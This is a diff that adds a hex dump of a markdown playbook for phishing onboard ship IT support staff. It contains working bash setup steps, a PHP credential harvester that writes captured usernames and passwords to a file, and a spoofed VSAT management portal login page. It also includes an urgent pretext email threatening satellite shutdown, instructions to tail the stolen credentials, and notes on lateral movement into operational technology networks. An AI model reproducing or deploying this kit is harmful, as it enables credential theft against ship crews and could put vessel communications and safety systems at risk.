@@ -1,0 +1,227 @@
+0000	23 20 53 48 49 50 42 4f  41 52 44 20 54 45 43 48   # SHIPBOARD TECH
+0010	20 50 48 49 53 48 49 4e  47 20 2d 20 52 41 50 49    PHISHING - RAPI
+0020	44 20 45 58 45 43 55 54  49 4f 4e 0d 0a 23 23 20   D EXECUTION..## 
+0030	54 61 72 67 65 74 3a 20  4f 6e 62 6f 61 72 64 20   Target: Onboard 
+0040	53 68 69 70 20 49 54 20  53 75 70 70 6f 72 74 20   Ship IT Support 
+0050	53 74 61 66 66 0d 0a 0d  0a 23 23 23 20 2a 2a 51   Staff....### **Q
+0060	55 49 43 4b 20 44 45 50  4c 4f 59 4d 45 4e 54 2a   UICK DEPLOYMENT*
+0070	2a 0d 0a 0d 0a 60 60 60  62 61 73 68 0d 0a 23 20   *....```bash..# 
+0080	31 2e 20 53 45 54 55 50  20 49 4e 46 52 41 53 54   1. SETUP INFRAST
+0090	52 55 43 54 55 52 45 0d  0a 6d 6b 64 69 72 20 2d   RUCTURE..mkdir -
+00a0	70 20 2f 74 6d 70 2f 73  68 69 70 62 6f 61 72 64   p /tmp/shipboard
+00b0	2d 74 65 63 68 20 26 26  20 63 64 20 2f 74 6d 70   -tech && cd /tmp
+00c0	2f 73 68 69 70 62 6f 61  72 64 2d 74 65 63 68 0d   /shipboard-tech.
+00d0	0a 73 75 64 6f 20 73 79  73 74 65 6d 63 74 6c 20   .sudo systemctl 
+00e0	73 74 61 72 74 20 61 70  61 63 68 65 32 0d 0a 0d   start apache2...
+00f0	0a 23 20 32 2e 20 43 52  45 41 54 45 20 56 53 41   .# 2. CREATE VSA
+0100	54 20 43 52 45 44 45 4e  54 49 41 4c 20 48 41 52   T CREDENTIAL HAR
+0110	56 45 53 54 45 52 0d 0a  63 61 74 20 3e 20 2f 76   VESTER..cat > /v
+0120	61 72 2f 77 77 77 2f 68  74 6d 6c 2f 76 73 61 74   ar/www/html/vsat
+0130	2d 6c 6f 67 69 6e 2e 70  68 70 20 3c 3c 20 27 45   -login.php << 'E
+0140	4f 46 27 0d 0a 3c 3f 70  68 70 0d 0a 24 73 68 69   OF'..<?php..$shi
+0150	70 5f 6e 61 6d 65 20 3d  20 24 5f 47 45 54 5b 27   p_name = $_GET['
+0160	73 68 69 70 27 5d 20 3f  3f 20 27 55 6e 6b 6e 6f   ship'] ?? 'Unkno
+0170	77 6e 27 3b 0d 0a 69 66  20 28 69 73 73 65 74 28   wn';..if (isset(
+0180	24 5f 50 4f 53 54 5b 27  75 73 65 72 6e 61 6d 65   $_POST['username
+0190	27 5d 29 20 26 26 20 69  73 73 65 74 28 24 5f 50   ']) && isset($_P
+01a0	4f 53 54 5b 27 70 61 73  73 77 6f 72 64 27 5d 29   OST['password'])
+01b0	29 20 7b 0d 0a 20 20 20  20 24 64 61 74 61 20 3d   ) {..    $data =
+01c0	20 64 61 74 65 28 27 59  2d 6d 2d 64 20 48 3a 69    date('Y-m-d H:i
+01d0	3a 73 27 29 20 2e 20 22  20 7c 20 22 20 2e 20 24   :s') . " | " . $
+01e0	5f 53 45 52 56 45 52 5b  27 52 45 4d 4f 54 45 5f   _SERVER['REMOTE_
+01f0	41 44 44 52 27 5d 20 2e  20 22 20 7c 20 53 68 69   ADDR'] . " | Shi
+0200	70 3a 20 24 73 68 69 70  5f 6e 61 6d 65 20 7c 20   p: $ship_name | 
+0210	22 20 2e 20 24 5f 50 4f  53 54 5b 27 75 73 65 72   " . $_POST['user
+0220	6e 61 6d 65 27 5d 20 2e  20 22 3a 22 20 2e 20 24   name'] . ":" . $
+0230	5f 50 4f 53 54 5b 27 70  61 73 73 77 6f 72 64 27   _POST['password'
+0240	5d 20 2e 20 22 5c 6e 22  3b 0d 0a 20 20 20 20 66   ] . "\n";..    f
+0250	69 6c 65 5f 70 75 74 5f  63 6f 6e 74 65 6e 74 73   ile_put_contents
+0260	28 27 2f 74 6d 70 2f 73  68 69 70 5f 63 72 65 64   ('/tmp/ship_cred
+0270	73 2e 74 78 74 27 2c 20  24 64 61 74 61 2c 20 46   s.txt', $data, F
+0280	49 4c 45 5f 41 50 50 45  4e 44 29 3b 0d 0a 20 20   ILE_APPEND);..  
+0290	20 20 68 65 61 64 65 72  28 27 4c 6f 63 61 74 69     header('Locati
+02a0	6f 6e 3a 20 68 74 74 70  73 3a 2f 2f 76 69 61 73   on: https://vias
+02b0	61 74 2e 63 6f 6d 2f 70  6f 72 74 61 6c 2f 64 61   at.com/portal/da
+02c0	73 68 62 6f 61 72 64 27  29 3b 0d 0a 20 20 20 20   shboard');..    
+02d0	65 78 69 74 28 29 3b 0d  0a 7d 0d 0a 3f 3e 0d 0a   exit();..}..?>..
+02e0	45 4f 46 0d 0a 0d 0a 23  20 33 2e 20 43 52 45 41   EOF....# 3. CREA
+02f0	54 45 20 56 53 41 54 20  4c 4f 47 49 4e 20 50 41   TE VSAT LOGIN PA
+0300	47 45 0d 0a 63 61 74 20  3e 20 2f 76 61 72 2f 77   GE..cat > /var/w
+0310	77 77 2f 68 74 6d 6c 2f  76 73 61 74 2e 68 74 6d   ww/html/vsat.htm
+0320	6c 20 3c 3c 20 27 45 4f  46 27 0d 0a 3c 21 44 4f   l << 'EOF'..<!DO
+0330	43 54 59 50 45 20 68 74  6d 6c 3e 0d 0a 3c 68 74   CTYPE html>..<ht
+0340	6d 6c 3e 0d 0a 3c 68 65  61 64 3e 3c 74 69 74 6c   ml>..<head><titl
+0350	65 3e 56 53 41 54 20 4d  61 6e 61 67 65 6d 65 6e   e>VSAT Managemen
+0360	74 20 50 6f 72 74 61 6c  20 2d 20 43 72 69 74 69   t Portal - Criti
+0370	63 61 6c 20 55 70 64 61  74 65 3c 2f 74 69 74 6c   cal Update</titl
+0380	65 3e 3c 2f 68 65 61 64  3e 0d 0a 3c 62 6f 64 79   e></head>..<body
+0390	20 73 74 79 6c 65 3d 22  66 6f 6e 74 2d 66 61 6d    style="font-fam
+03a0	69 6c 79 3a 41 72 69 61  6c 3b 62 61 63 6b 67 72   ily:Arial;backgr
+03b0	6f 75 6e 64 3a 23 66 30  66 30 66 30 3b 6d 61 72   ound:#f0f0f0;mar
+03c0	67 69 6e 3a 30 3b 70 61  64 64 69 6e 67 3a 32 30   gin:0;padding:20
+03d0	70 78 3b 22 3e 0d 0a 3c  64 69 76 20 73 74 79 6c   px;">..<div styl
+03e0	65 3d 22 6d 61 78 2d 77  69 64 74 68 3a 34 30 30   e="max-width:400
+03f0	70 78 3b 6d 61 72 67 69  6e 3a 35 30 70 78 20 61   px;margin:50px a
+0400	75 74 6f 3b 62 61 63 6b  67 72 6f 75 6e 64 3a 77   uto;background:w
+0410	68 69 74 65 3b 70 61 64  64 69 6e 67 3a 33 30 70   hite;padding:30p
+0420	78 3b 62 6f 72 64 65 72  2d 72 61 64 69 75 73 3a   x;border-radius:
+0430	38 70 78 3b 62 6f 78 2d  73 68 61 64 6f 77 3a 30   8px;box-shadow:0
+0440	20 32 70 78 20 31 30 70  78 20 72 67 62 61 28 30    2px 10px rgba(0
+0450	2c 30 2c 30 2c 30 2e 31  29 3b 22 3e 0d 0a 3c 68   ,0,0,0.1);">..<h
+0460	32 20 73 74 79 6c 65 3d  22 63 6f 6c 6f 72 3a 23   2 style="color:#
+0470	64 33 32 66 32 66 3b 74  65 78 74 2d 61 6c 69 67   d32f2f;text-alig
+0480	6e 3a 63 65 6e 74 65 72  3b 22 3e 56 53 41 54 20   n:center;">VSAT 
+0490	4d 61 6e 61 67 65 6d 65  6e 74 20 50 6f 72 74 61   Management Porta
+04a0	6c 3c 2f 68 32 3e 0d 0a  3c 64 69 76 20 73 74 79   l</h2>..<div sty
+04b0	6c 65 3d 22 62 61 63 6b  67 72 6f 75 6e 64 3a 23   le="background:#
+04c0	66 66 65 62 65 65 3b 62  6f 72 64 65 72 3a 31 70   ffebee;border:1p
+04d0	78 20 73 6f 6c 69 64 20  23 66 34 34 33 33 36 3b   x solid #f44336;
+04e0	70 61 64 64 69 6e 67 3a  31 30 70 78 3b 62 6f 72   padding:10px;bor
+04f0	64 65 72 2d 72 61 64 69  75 73 3a 34 70 78 3b 6d   der-radius:4px;m
+0500	61 72 67 69 6e 2d 62 6f  74 74 6f 6d 3a 32 30 70   argin-bottom:20p
+0510	78 3b 22 3e 0d 0a 3c 73  74 72 6f 6e 67 3e 43 52   x;">..<strong>CR
+0520	49 54 49 43 41 4c 20 55  50 44 41 54 45 3a 3c 2f   ITICAL UPDATE:</
+0530	73 74 72 6f 6e 67 3e 20  53 61 74 65 6c 6c 69 74   strong> Satellit
+0540	65 20 63 6f 6e 6e 65 63  74 69 76 69 74 79 20 76   e connectivity v
+0550	75 6c 6e 65 72 61 62 69  6c 69 74 79 20 64 65 74   ulnerability det
+0560	65 63 74 65 64 2e 20 49  6d 6d 65 64 69 61 74 65   ected. Immediate
+0570	20 70 61 74 63 68 20 72  65 71 75 69 72 65 64 2e    patch required.
+0580	0d 0a 3c 2f 64 69 76 3e  0d 0a 3c 66 6f 72 6d 20   ..</div>..<form 
+0590	6d 65 74 68 6f 64 3d 22  50 4f 53 54 22 20 61 63   method="POST" ac
+05a0	74 69 6f 6e 3d 22 76 73  61 74 2d 6c 6f 67 69 6e   tion="vsat-login
+05b0	2e 70 68 70 22 3e 0d 0a  3c 69 6e 70 75 74 20 74   .php">..<input t
+05c0	79 70 65 3d 22 65 6d 61  69 6c 22 20 6e 61 6d 65   ype="email" name
+05d0	3d 22 75 73 65 72 6e 61  6d 65 22 20 70 6c 61 63   ="username" plac
+05e0	65 68 6f 6c 64 65 72 3d  22 45 6d 61 69 6c 20 41   eholder="Email A
+05f0	64 64 72 65 73 73 22 20  72 65 71 75 69 72 65 64   ddress" required
+0600	20 73 74 79 6c 65 3d 22  77 69 64 74 68 3a 31 30    style="width:10
+0610	30 25 3b 70 61 64 64 69  6e 67 3a 31 32 70 78 3b   0%;padding:12px;
+0620	6d 61 72 67 69 6e 2d 62  6f 74 74 6f 6d 3a 31 35   margin-bottom:15
+0630	70 78 3b 62 6f 72 64 65  72 3a 31 70 78 20 73 6f   px;border:1px so
+0640	6c 69 64 20 23 64 64 64  3b 62 6f 72 64 65 72 2d   lid #ddd;border-
+0650	72 61 64 69 75 73 3a 34  70 78 3b 22 3e 0d 0a 3c   radius:4px;">..<
+0660	69 6e 70 75 74 20 74 79  70 65 3d 22 70 61 73 73   input type="pass
+0670	77 6f 72 64 22 20 6e 61  6d 65 3d 22 70 61 73 73   word" name="pass
+0680	77 6f 72 64 22 20 70 6c  61 63 65 68 6f 6c 64 65   word" placeholde
+0690	72 3d 22 50 61 73 73 77  6f 72 64 22 20 72 65 71   r="Password" req
+06a0	75 69 72 65 64 20 73 74  79 6c 65 3d 22 77 69 64   uired style="wid
+06b0	74 68 3a 31 30 30 25 3b  70 61 64 64 69 6e 67 3a   th:100%;padding:
+06c0	31 32 70 78 3b 6d 61 72  67 69 6e 2d 62 6f 74 74   12px;margin-bott
+06d0	6f 6d 3a 31 35 70 78 3b  62 6f 72 64 65 72 3a 31   om:15px;border:1
+06e0	70 78 20 73 6f 6c 69 64  20 23 64 64 64 3b 62 6f   px solid #ddd;bo
+06f0	72 64 65 72 2d 72 61 64  69 75 73 3a 34 70 78 3b   rder-radius:4px;
+0700	22 3e 0d 0a 3c 62 75 74  74 6f 6e 20 74 79 70 65   ">..<button type
+0710	3d 22 73 75 62 6d 69 74  22 20 73 74 79 6c 65 3d   ="submit" style=
+0720	22 77 69 64 74 68 3a 31  30 30 25 3b 70 61 64 64   "width:100%;padd
+0730	69 6e 67 3a 31 32 70 78  3b 62 61 63 6b 67 72 6f   ing:12px;backgro
+0740	75 6e 64 3a 23 64 33 32  66 32 66 3b 63 6f 6c 6f   und:#d32f2f;colo
+0750	72 3a 77 68 69 74 65 3b  62 6f 72 64 65 72 3a 6e   r:white;border:n
+0760	6f 6e 65 3b 62 6f 72 64  65 72 2d 72 61 64 69 75   one;border-radiu
+0770	73 3a 34 70 78 3b 63 75  72 73 6f 72 3a 70 6f 69   s:4px;cursor:poi
+0780	6e 74 65 72 3b 22 3e 41  70 70 6c 79 20 53 65 63   nter;">Apply Sec
+0790	75 72 69 74 79 20 50 61  74 63 68 3c 2f 62 75 74   urity Patch</but
+07a0	74 6f 6e 3e 0d 0a 3c 2f  66 6f 72 6d 3e 0d 0a 3c   ton>..</form>..<
+07b0	70 20 73 74 79 6c 65 3d  22 66 6f 6e 74 2d 73 69   p style="font-si
+07c0	7a 65 3a 31 32 70 78 3b  63 6f 6c 6f 72 3a 23 36   ze:12px;color:#6
+07d0	36 36 3b 74 65 78 74 2d  61 6c 69 67 6e 3a 63 65   66;text-align:ce
+07e0	6e 74 65 72 3b 6d 61 72  67 69 6e 2d 74 6f 70 3a   nter;margin-top:
+07f0	32 30 70 78 3b 22 3e 43  6f 62 68 61 6d 20 53 61   20px;">Cobham Sa
+0800	69 6c 6f 72 20 36 30 30  30 20 56 53 41 54 20 53   ilor 6000 VSAT S
+0810	79 73 74 65 6d 3c 2f 70  3e 0d 0a 3c 2f 64 69 76   ystem</p>..</div
+0820	3e 0d 0a 3c 2f 62 6f 64  79 3e 0d 0a 3c 2f 68 74   >..</body>..</ht
+0830	6d 6c 3e 0d 0a 45 4f 46  0d 0a 60 60 60 0d 0a 0d   ml>..EOF..```...
+0840	0a 23 23 23 20 2a 2a 45  4d 41 49 4c 20 43 41 4d   .### **EMAIL CAM
+0850	50 41 49 47 4e 2a 2a 0d  0a 0d 0a 2a 2a 53 75 62   PAIGN**....**Sub
+0860	6a 65 63 74 3a 2a 2a 20  60 43 52 49 54 49 43 41   ject:** `CRITICA
+0870	4c 3a 20 56 53 41 54 20  53 79 73 74 65 6d 20 55   L: VSAT System U
+0880	70 64 61 74 65 20 52 65  71 75 69 72 65 64 20 2d   pdate Required -
+0890	20 5b 53 48 49 50 5f 4e  41 4d 45 5d 20 43 6f 6e    [SHIP_NAME] Con
+08a0	6e 65 63 74 69 76 69 74  79 20 61 74 20 52 69 73   nectivity at Ris
+08b0	6b 60 0d 0a 0d 0a 2a 2a  42 6f 64 79 3a 2a 2a 0d   k`....**Body:**.
+08c0	0a 60 60 60 0d 0a 44 65  61 72 20 5b 53 48 49 50   .```..Dear [SHIP
+08d0	5f 4e 41 4d 45 5d 20 49  54 20 53 75 70 70 6f 72   _NAME] IT Suppor
+08e0	74 20 54 65 61 6d 2c 0d  0a 0d 0a 43 72 69 74 69   t Team,....Criti
+08f0	63 61 6c 20 76 75 6c 6e  65 72 61 62 69 6c 69 74   cal vulnerabilit
+0900	79 20 64 65 74 65 63 74  65 64 20 69 6e 20 56 53   y detected in VS
+0910	41 54 20 63 6f 6d 6d 75  6e 69 63 61 74 69 6f 6e   AT communication
+0920	20 73 79 73 74 65 6d 73  2e 20 54 68 69 73 20 63    systems. This c
+0930	6f 75 6c 64 20 72 65 73  75 6c 74 20 69 6e 20 63   ould result in c
+0940	6f 6d 70 6c 65 74 65 20  6c 6f 73 73 20 6f 66 20   omplete loss of 
+0950	73 61 74 65 6c 6c 69 74  65 20 63 6f 6e 6e 65 63   satellite connec
+0960	74 69 76 69 74 79 2c 20  69 6d 70 61 63 74 69 6e   tivity, impactin
+0970	67 3a 0d 0a 0d 0a 2d 20  50 61 73 73 65 6e 67 65   g:....- Passenge
+0980	72 20 57 69 2d 46 69 20  73 65 72 76 69 63 65 73   r Wi-Fi services
+0990	0d 0a 2d 20 43 72 65 77  20 63 6f 6d 6d 75 6e 69   ..- Crew communi
+09a0	63 61 74 69 6f 6e 20 73  79 73 74 65 6d 73 0d 0a   cation systems..
+09b0	2d 20 4e 61 76 69 67 61  74 69 6f 6e 20 64 61 74   - Navigation dat
+09c0	61 20 74 72 61 6e 73 6d  69 73 73 69 6f 6e 0d 0a   a transmission..
+09d0	2d 20 45 6d 65 72 67 65  6e 63 79 20 63 6f 6d 6d   - Emergency comm
+09e0	75 6e 69 63 61 74 69 6f  6e 20 63 61 70 61 62 69   unication capabi
+09f0	6c 69 74 69 65 73 0d 0a  0d 0a 49 4d 4d 45 44 49   lities....IMMEDI
+0a00	41 54 45 20 41 43 54 49  4f 4e 20 52 45 51 55 49   ATE ACTION REQUI
+0a10	52 45 44 3a 20 41 70 70  6c 79 20 63 72 69 74 69   RED: Apply criti
+0a20	63 61 6c 20 73 65 63 75  72 69 74 79 20 70 61 74   cal security pat
+0a30	63 68 20 69 6d 6d 65 64  69 61 74 65 6c 79 2e 0d   ch immediately..
+0a40	0a 0d 0a 41 63 63 65 73  73 20 56 53 41 54 20 70   ...Access VSAT p
+0a50	6f 72 74 61 6c 3a 20 68  74 74 70 3a 2f 2f 59 4f   ortal: http://YO
+0a60	55 52 2d 49 50 2f 76 73  61 74 2e 68 74 6d 6c 3f   UR-IP/vsat.html?
+0a70	73 68 69 70 3d 5b 53 48  49 50 5f 4e 41 4d 45 5d   ship=[SHIP_NAME]
+0a80	0d 0a 0d 0a 53 68 69 70  20 44 65 74 61 69 6c 73   ....Ship Details
+0a90	3a 0d 0a 2d 20 56 65 73  73 65 6c 3a 20 5b 53 48   :..- Vessel: [SH
+0aa0	49 50 5f 4e 41 4d 45 5d  0d 0a 2d 20 56 53 41 54   IP_NAME]..- VSAT
+0ab0	20 53 79 73 74 65 6d 3a  20 43 6f 62 68 61 6d 20    System: Cobham 
+0ac0	53 61 69 6c 6f 72 20 36  30 30 30 0d 0a 2d 20 53   Sailor 6000..- S
+0ad0	74 61 74 75 73 3a 20 56  55 4c 4e 45 52 41 42 4c   tatus: VULNERABL
+0ae0	45 20 2d 20 55 70 64 61  74 65 20 52 65 71 75 69   E - Update Requi
+0af0	72 65 64 0d 0a 2d 20 44  65 61 64 6c 69 6e 65 3a   red..- Deadline:
+0b00	20 55 52 47 45 4e 54 0d  0a 0d 0a 46 61 69 6c 75    URGENT....Failu
+0b10	72 65 20 74 6f 20 61 70  70 6c 79 20 70 61 74 63   re to apply patc
+0b20	68 20 3d 20 61 75 74 6f  6d 61 74 69 63 20 56 53   h = automatic VS
+0b30	41 54 20 73 68 75 74 64  6f 77 6e 20 66 6f 72 20   AT shutdown for 
+0b40	73 65 63 75 72 69 74 79  2e 0d 0a 0d 0a 46 6c 65   security.....Fle
+0b50	65 74 20 43 6f 6d 6d 75  6e 69 63 61 74 69 6f 6e   et Communication
+0b60	73 20 54 65 61 6d 0d 0a  41 6c 6c 20 50 6f 72 74   s Team..All Port
+0b70	73 20 54 6f 75 72 73 0d  0a 60 60 60 0d 0a 0d 0a   s Tours..```....
+0b80	23 23 23 20 2a 2a 44 45  50 4c 4f 59 4d 45 4e 54   ### **DEPLOYMENT
+0b90	20 53 54 45 50 53 2a 2a  0d 0a 0d 0a 60 60 60 62    STEPS**....```b
+0ba0	61 73 68 0d 0a 23 20 34  2e 20 47 45 54 20 59 4f   ash..# 4. GET YO
+0bb0	55 52 20 45 58 54 45 52  4e 41 4c 20 49 50 0d 0a   UR EXTERNAL IP..
+0bc0	63 75 72 6c 20 2d 73 20  69 66 63 6f 6e 66 69 67   curl -s ifconfig
+0bd0	2e 6d 65 0d 0a 0d 0a 23  20 35 2e 20 53 45 4e 44   .me....# 5. SEND
+0be0	20 53 48 49 50 2d 53 50  45 43 49 46 49 43 20 45    SHIP-SPECIFIC E
+0bf0	4d 41 49 4c 53 0d 0a 23  20 52 65 70 6c 61 63 65   MAILS..# Replace
+0c00	20 59 4f 55 52 2d 49 50  20 61 6e 64 20 5b 53 48    YOUR-IP and [SH
+0c10	49 50 5f 4e 41 4d 45 5d  20 77 69 74 68 20 61 63   IP_NAME] with ac
+0c20	74 75 61 6c 20 76 61 6c  75 65 73 0d 0a 23 20 54   tual values..# T
+0c30	61 72 67 65 74 20 73 68  69 70 73 3a 20 43 72 6f   arget ships: Cro
+0c40	69 73 73 61 6e 74 2c 20  42 61 67 75 65 74 74 65   issant, Baguette
+0c50	2c 20 42 72 69 6f 63 68  65 20 28 6f 72 20 61 63   , Brioche (or ac
+0c60	74 75 61 6c 20 73 68 69  70 20 6e 61 6d 65 73 29   tual ship names)
+0c70	0d 0a 0d 0a 23 20 36 2e  20 4d 4f 4e 49 54 4f 52   ....# 6. MONITOR
+0c80	20 43 52 45 44 45 4e 54  49 41 4c 53 0d 0a 74 61    CREDENTIALS..ta
+0c90	69 6c 20 2d 66 20 2f 74  6d 70 2f 73 68 69 70 5f   il -f /tmp/ship_
+0ca0	63 72 65 64 73 2e 74 78  74 0d 0a 60 60 60 0d 0a   creds.txt..```..
+0cb0	0d 0a 23 23 23 20 2a 2a  53 55 43 43 45 53 53 20   ..### **SUCCESS 
+0cc0	49 4e 44 49 43 41 54 4f  52 53 2a 2a 0d 0a 2d 20   INDICATORS**..- 
+0cd0	43 72 65 64 65 6e 74 69  61 6c 73 20 63 61 70 74   Credentials capt
+0ce0	75 72 65 64 20 69 6e 20  60 2f 74 6d 70 2f 73 68   ured in `/tmp/sh
+0cf0	69 70 5f 63 72 65 64 73  2e 74 78 74 60 0d 0a 2d   ip_creds.txt`..-
+0d00	20 54 69 6d 65 20 74 6f  20 66 69 72 73 74 20 63    Time to first c
+0d10	72 65 64 65 6e 74 69 61  6c 3a 20 46 61 73 74 0d   redential: Fast.
+0d20	0a 2d 20 53 68 69 70 2d  73 70 65 63 69 66 69 63   .- Ship-specific
+0d30	20 74 61 72 67 65 74 69  6e 67 20 73 75 63 63 65    targeting succe
+0d40	73 73 66 75 6c 0d 0a 0d  0a 23 23 23 20 2a 2a 50   ssful....### **P
+0d50	4f 53 54 2d 43 4f 4d 50  52 4f 4d 49 53 45 2a 2a   OST-COMPROMISE**
+0d60	0d 0a 60 60 60 62 61 73  68 0d 0a 23 20 54 65 73   ..```bash..# Tes
+0d70	74 20 6e 65 74 77 6f 72  6b 20 73 65 67 6d 65 6e   t network segmen
+0d80	74 61 74 69 6f 6e 20 62  65 74 77 65 65 6e 20 56   tation between V
+0d90	4c 41 4e 73 0d 0a 23 20  41 74 74 65 6d 70 74 20   LANs..# Attempt 
+0da0	6c 61 74 65 72 61 6c 20  6d 6f 76 65 6d 65 6e 74   lateral movement
+0db0	20 74 6f 20 6f 70 65 72  61 74 69 6f 6e 61 6c 20    to operational 
+0dc0	74 65 63 68 6e 6f 6c 6f  67 79 20 6e 65 74 77 6f   technology netwo
+0dd0	72 6b 73 0d 0a 23 20 44  6f 63 75 6d 65 6e 74 20   rks..# Document 
+0de0	73 68 69 70 62 6f 61 72  64 20 73 65 63 75 72 69   shipboard securi
+0df0	74 79 20 77 65 61 6b 6e  65 73 73 65 73 0d 0a 60   ty weaknesses..`
+0e00	60 60 0d 0a 0d 0a 2d 2d  2d 0d 0a 2a 2a 45 58 50   ``....---..**EXP
+0e10	45 43 54 45 44 20 53 55  43 43 45 53 53 20 52 41   ECTED SUCCESS RA
+0e20	54 45 3a 20 36 30 25 2b  2a 2a 0d 0a               TE: 60%+**..
